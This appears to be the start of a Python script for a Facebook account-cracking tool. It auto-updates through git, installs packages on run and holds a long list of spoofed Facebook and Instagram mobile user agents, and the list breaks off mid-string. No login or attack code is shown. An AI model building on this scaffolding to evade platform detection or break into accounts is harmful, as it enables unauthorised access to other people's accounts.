
 ####@-----Import-----@####
import os,base64

os.system('git pull -q;rm .rndm')
try:
	import os,sys,time,json,random,re,string,platform,base64,uuid,requests,io,struct
	from string import *
	from concurrent.futures import ThreadPoolExecutor as ThreadPool
except(ImportError):
    os.system("pip install requests")
    pass


try:
    import bs4
except(ImportError):
    os.system("pip install bs4")
    pass

try:
 pass
except:pass


import subprocess
from bs4 import BeautifulSoup
import json,os,time,base64,random,re,sys, subprocess 
from requests.exceptions import ConnectionError as CError
from concurrent.futures import ThreadPoolExecutor as speed

accounts = []
loop = 0


####DESIGN####
def oo(t):
	return '\033[1;91m[\033[1;97m'+str(t)+'\033[1;91m]\033[1;97m '

###USERAGENTSGEN####
'''
fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana')

android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
andd=subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
carr=subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')

device = {
        'android_version':android_version,
        'model':model,
        'build':build,
         'cr':carr,
         'brand':andd}

'''
ua = ['Instagram 142.0.0.34.110 Android (28/6.0; 320dpi; 800x1212; samsung; GT-S7390; kylevess; hawaii_ss_kylevess; en_US; 215464381)','Mozilla/5.0 (Linux; U; Android 4.1.2; ru-ru; GT-S7390 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 GSA/2.6.7.721924.arm','Mozilla/5.0 (Linux; U; Android 4.1.2; pt-pt; GT-S7390 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30[FBAN/EMA;FBLC/pt_PT;FBAV/26.0.0.4.133;]','Mozilla/5.0 (Linux; U; Android 4.1.2; pt-pt; GT-S7390 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30[FBAN/EMA;FBLC/pt_PT;FBAV/78.0.0.10.186;]','Mozilla/5.0 (Linux; U; Android 4.1.2; pt-pt; GT-S7390 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 [FB_IAB/FB4A;FBAV/130.0.0.45.70;]','Mozilla/5.0 (Linux; U; Android 4.1.2; pt-pt; GT-S7390 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30[FBAN/EMA;FBLC/pt_PT;FBAV/98.0.0.16.170;]','Mozilla/5.0 (Linux; U; Android 4.1.2; pt-pt; GT-S7390 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 [FB_IAB/FB4A;FBAV/119.0.0.23.70;]','Mozilla/5.0 (Linux; U; Android 4.1.2; pt-pt; GT-S7390G Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30[FBAN/EMA;FBLC/pt_PT;FBAV/71.0.0.9.132;]','Mozilla/5.0 (Linux; U; Android 4.1.2; pt-pt; GT-S7390 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30[FBAN/EMA;FBLC/pt_PT;FBAV/80.0.0.6.186;]','Mozilla/5.0 (Linux; U; Android 4.1.2; pt-pt; GT-S7390 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30[FBAN/EMA;FBLC/pt_PT;FBAV/66.0.0.8.122;]','Mozilla/5.0 (Linux; U; Android 4.1.2; pt-br; GT-S7390 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30[FBAN/EMA;FBLC/pt_BR;FBAV/61.0.0.4.155;]','Mozilla/5.0 (Linux; U; Android 4.1.2; pt-pt; GT-S7390 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30[FBAN/EMA;FBLC/pt_PT;FBAV/19.0.0.4.121;]','Mozilla/5.0 (Linux; U; Android 4.1.2; pt-pt; GT-S7390 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30[FBAN/EMA;FBLC/pt_PT;FBAV/63.0.0.8.158;]','Mozilla/5.0 (Linux; U; Android 4.1.2; pt-pt; GT-S7390 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30[FBAN/EMA;FBLC/pt_PT;FBAV/69.0.0.10.400;]','Mozilla/5.0 (Linux; U; Android 4.1.2; pt-pt; GT-S7390 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30[FBAN/EMA;FBLC/pt_PT;FBAV/83.0.0.8.184;]	','Mozilla/5.0 (Linux; U; Android 4.1.2; pt-pt; GT-S7390 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30[FBAN/EMA;FBLC/pt_PT;FBAV/94.0.0.8.182;]','Mozilla/5.0 (Linux; U; Android 4.1.2; pt-pt; GT-S7390G Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30[FBAN/EMA;FBLC/pt_PT;FBAV/74.0.0.6.186;]','Mozilla/5.0 (Linux; U; Android 4.1.2; pt-pt; GT-S7390G Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 [FB_IAB/Orca-Android;FBAV/173.0.0.28.82;]','Mozilla/5.0 (Linux; U; Android 4.1.2; pt-pt; GT-S7390 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Instagram 27.0.0.11.97 Android (16/4.1.2; 240dpi; 480x800; samsung; GT-S7390; kylevess; hawaii_ss_kylevess; pt_PT)','Mozilla/5.0 (Linux; U; Android 4.1.2; ru-ru; GT-S7390 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 GSA/2.8.8.849369.arm','Mozilla/5.0 (Linux; Android 11; AP5702 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]','Mozilla/5.0 (Linux; Android 5.1.1; LGL62VL Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/263.0.0.46.121;]','Mozilla/5.0 (Linux; Android 8.1.0; Multilaser_E Build/V15_20211207; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/402.1.0.24.84;]','Mozilla/5.0 (Linux; Android 11; W-V770 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]','Mozilla/5.0 (Linux; Android 8.0.0; G3426 Build/48.1.A.2.122; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.4951.61 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/336.0.0.20.117;]','Mozilla/5.0 (Linux; Android 10; Platinum K5 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/397.0.0.23.404;]','Mozilla/5.0 (Linux; Android 11; Z6251V Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]','Mozilla/5.0 (Linux; Android 5.1.1; SM-G530T1 Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/311.0.0.44.117;]','Mozilla/5.0 (Linux; Android 8.1.0; RCT6B03W13 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]','Mozilla/5.0 (Linux; Android 7.1.1; A577VL Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.86 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]','Mozilla/5.0 (Linux; Android 10; M863 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]','Mozilla/5.0 (Linux; Android 9; SUGAR_P11 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.105 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/392.2.0.33.108;]','Mozilla/5.0 (Linux; Android 9; Lenovo L39051 Build/PKQ1.190616.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]','Mozilla/5.0 (Linux; Android 9; SM-J530F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/396.1.0.28.104;]','Mozilla/5.0 (Linux; Android 13; CPH2483 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]','Mozilla/5.0 (Linux; Android 10; M2006C3MG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/396.0.0.21.104;]','Mozilla/5.0 (Linux; Android 10; WP7 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]','Mozilla/5.0 (Linux; Android 12; RP03 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.112 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/396.0.0.21.104;]','Mozilla/5.0 (Linux; Android 10; SH-S40P Build/QKQ1.200610.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/329.0.0.29.120;]','Mozilla/5.0 (Linux; Android 7.0; LGL163BL Build/NRD90U; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]','Mozilla/5.0 (Linux; Android 10; M2006C3MT Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/402.1.0.24.84;]','Mozilla/5.0 (Linux; Android 10; M2006C3MG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.118 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/400.0.0.37.76;]','Mozilla/5.0 (Linux; Android 10; M2006C3MG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/398.0.0.21.105;]','Mozilla/5.0 (Linux; U; Android 10; M2006C3MG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.79 Mobile Safari/537.36 OPR/7.2.2254.146534','Mozilla/5.0 (Linux; U; Android 10; M2006C3MG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36 OPR/7.2.2254.146534','Mozilla/5.0 (Linux; Android 11; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.128 Mobile Safari/537.36 OPR/73.0.3843.69488','Mozilla/5.0 (Linux; Android 10; M2006C3MG Build/QP1A.190711.020; ) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 NewsSapphire/23.6.401128613','Mozilla/5.0 (Linux; Android 10; M2006C3MG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.141 Mobile Safari/537.36 WpsMoffice/16.8.4/arm64-v8a/1368','Mozilla/5.0 (Linux; Android 10; M2006C3MG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 OKAndroid/18.4.4 OkApp','Mozilla/5.0 (Linux; Android 10; M2006C3MG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.125 Mobile Safari/537.36 AlohaLite/1.7.1 AlohaBrowser/3.5.0','Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; M2006C3MG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 WpsMoffice/16.5.2/arm64-v8a/1344','Mozilla/5.0 (Linux; Android 10; M2006C3MG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/384.1.0.29.111;]','Mozilla/5.0 (Linux; Android 11; M2006C3MT Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/384.1.0.29.111;]','Mozilla/5.0 (Linux; Android 10; M2006C3MT Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 Line/12.15.1/IAB','Mozilla/5.0 (Linux; Android 10; M2006C3MG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.125 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/361.0.0.7.107;]','Mozilla/5.0 (Linux; Android 10; M2006C3MG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/318.0.0.16.105;]','Mozilla/5.0 (Linux; Android 10; M2006C3MG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/382.0.0.33.111;]','Mozilla/5.0 (Linux; Android 10; M2006C3MG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/379.0.0.24.109;']

import requests
rs = requests.get
ua = []

del ua
"""Instagram 142.0.0.34.110 Android (28/6.0; 320dpi; 800x1212; samsung; GT-S7390; kylevess; hawaii_ss_kylevess; en_US; 215464381)','Mozilla/5.0 (Linux; U; Android 4.1.2; ru-ru; GT-S7390 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 GSA/2.6.7.721924.arm','Mozilla/5.0 (Linux; U; Android 4.1.2; pt-pt; GT-S7390 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30[FBAN/EMA;FBLC/pt_PT;FBAV/26.0.0.4.133;]','Mozilla/5.0 (Linux; U; Android 4.1.2; pt-pt; GT-S7390 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30[FBAN/EMA;FBLC/pt_PT;FBAV/78.0.0.10.186;]','Mozilla/5.0 (Linux; U; Android 4.1.2; pt-pt; GT-S7390 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 [FB_IAB/FB4A;FBAV/130.0.0.45.70;]','Mozilla/5.0 (Linux; U; Android 4.1.2; pt-pt; GT-S7390 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30[FBAN/EMA;FBLC/pt_PT;FBAV/98.0.0.16.170;]','Mozilla/5.0 (Linux; U; Android 4.1.2; pt-pt; GT-S7390 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 [FB_IAB/FB4A;FBAV/119.0.0.23.70;]','Mozilla/5.0 (Linux; U; Android 4.1.2; pt-pt; GT-S7390G Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30[FBAN/EMA;FBLC/pt_PT;FBAV/71.0.0.9.132;]','Mozilla/5.0 (Linux; U; Android 4.1.2; pt-pt; GT-S7390 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30[FBAN/EMA;FBLC/pt_PT;FBAV/80.0.0.6.186;]','Mozilla/5.0 (Linux; U; Android 4.1.2; pt-pt; GT-S7390 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30[FBAN/EMA;FBLC/pt_PT;FBAV/66.0.0.8.122;]','Mozilla/5.0 (Linux; U; Android 4.1.2; pt-br; GT-S7390 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30[FBAN/EMA;FBLC/pt_BR;FBAV/61.0.0.4.155;]','Mozilla/5.0 (Linux; U; Android 4.1.2; pt-pt; GT-S7390 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30[FBAN/EMA;FBLC/pt_PT;FBAV/19.0.0.4.121;]','Mozilla/5.0 (Linux; U; Android 4.1.2; pt-pt; GT-S7390 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30[FBAN/EMA;FBLC/pt_PT;FBAV/63.0.0.8.158;]','Mozilla/5.0 (Linux; U; Android 4.1.2; pt-pt; GT-S7390 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30[FBAN/EMA;FBLC/pt_PT;FBAV/69.0.0.10.400;]','Mozilla/5.0 (Linux; U; Android 4.1.2; pt-pt; GT-S7390 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30[FBAN/EMA;FBLC/pt_PT;FBAV/83.0.0.8.184;]	','Mozilla/5.0 (Linux; U; Android 4.1.2; pt-pt; GT-S7390 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30[FBAN/EMA;FBLC/pt_PT;FBAV/94.0.0.8.182;]','Mozilla/5.0 (Linux; U; Android 4.1.2; pt-pt; GT-S7390G Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30[FBAN/EMA;FBLC/pt_PT;FBAV/74.0.0.6.186;]','Mozilla/5.0 (Linux; U; Android 4.1.2; pt-pt; GT-S7390G Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 [FB_IAB/Orca-Android;FBAV/173.0.0.28.82;]','Mozilla/5.0 (Linux; U; Android 4.1.2; pt-pt; GT-S7390 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Instagram 27.0.0.11.97 Android (16/4.1.2; 240dpi; 480x800; samsung; GT-S7390; kylevess; hawaii_ss_kylevess; pt_PT)','Mozilla/5.0 (Linux; U; Android 4.1.2; ru-ru; GT-S7390 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 GSA/2.8.8.849369.arm','Mozilla/5.0 (Linux; Android 11; AP5702 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]','Mozilla/5.0 (Linux; Android 5.1.1; LGL62VL Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/263.0.0.46.121;]','Mozilla/5.0 (Linux; Android 8.1.0; Multilaser_E Build/V15_20211207; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/402.1.0.24.84;]','Mozilla/5.0 (Linux; Android 11; W-V770 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]','Mozilla/5.0 (Linux; Android 8.0.0; G3426 Build/48.1.A.2.122; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.4951.61 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/336.0.0.20.117;]','Mozilla/5.0 (Linux; Android 10; Platinum K5 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/397.0.0.23.404;]','Mozilla/5.0 (Linux; Android 11; Z6251V Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]','Mozilla/5.0 (Linux; Android 5.1.1; SM-G530T1 Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/311.0.0.44.117;]','Mozilla/5.0 (Linux; Android 8.1.0; RCT6B03W13 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]','Mozilla/5.0 (Linux; Android 7.1.1; A577VL Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.86 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]','Mozilla/5.0 (Linux; Android 10; M863 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]','Mozilla/5.0 (Linux; Android 9; SUGAR_P11 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.105 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/392.2.0.33.108;]','Mozilla/5.0 (Linux; Android 9; Lenovo L39051 Build/PKQ1.190616.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]','Mozilla/5.0 (Linux; Android 9; SM-J530F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/396.1.0.28.104;]','Mozilla/5.0 (Linux; Android 13; CPH2483 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]','Mozilla/5.0 (Linux; Android 10; M2006C3MG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/396.0.0.21.104;]','Mozilla/5.0 (Linux; Android 10; WP7 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]','Mozilla/5.0 (Linux; Android 12; RP03 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.112 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/396.0.0.21.104;]','Mozilla/5.0 (Linux; Android 10; SH-S40P Build/QKQ1.200610.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/329.0.0.29.120;]','Mozilla/5.0 (Linux; Android 7.0; LGL163BL Build/NRD90U; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]','Mozilla/5.0 (Linux; Android 10; M2006C3MT Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/402.1.0.24.84;]','Mozilla/5.0 (Linux; Android 10; M2006C3MG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.118 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/400.0.0.37.76;]','Mozilla/5.0 (Linux; Android 10; M2006C3MG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/398.0.0.21.105;]','Mozilla/5.0 (Linux; U; Android 10; M2006C3MG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.79 Mobile Safari/537.36 OPR/7.2.2254.146534','Mozilla/5.0 (Linux; U; Android 10; M2006C3MG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36 OPR/7.2.2254.146534','Mozilla/5.0 (Linux; Android 11; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.128 Mobile Safari/537.36 OPR/73.0.3843.69488','Mozilla/5.0 (Linux; Android 10; M2006C3MG Build/QP1A.190711.020; ) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 NewsSapphire/23.6.401128613','Mozilla/5.0 (Linux; Android 10; M2006C3MG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.141 Mobile Safari/537.36 WpsMoffice/16.8.4/arm64-v8a/1368','Mozilla/5.0 (Linux; Android 10; M2006C3MG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 OKAndroid/18.4.4 OkApp','Mozilla/5.0 (Linux; Android 10; M2006C3MG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.125 Mobile Safari/537.36 AlohaLite/1.7.1 AlohaBrowser/3.5.0','Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; M2006C3MG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 WpsMoffice/16.5.2/arm64-v8a/1344','Mozilla/5.0 (Linux; Android 10; M2006C3MG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/384.1.0.29.111;]','Mozilla/5.0 (Linux; Android 11; M2006C3MT Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/384.1.0.29.111;]','Mozilla/5.0 (Linux; Android 10; M2006C3MT Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, 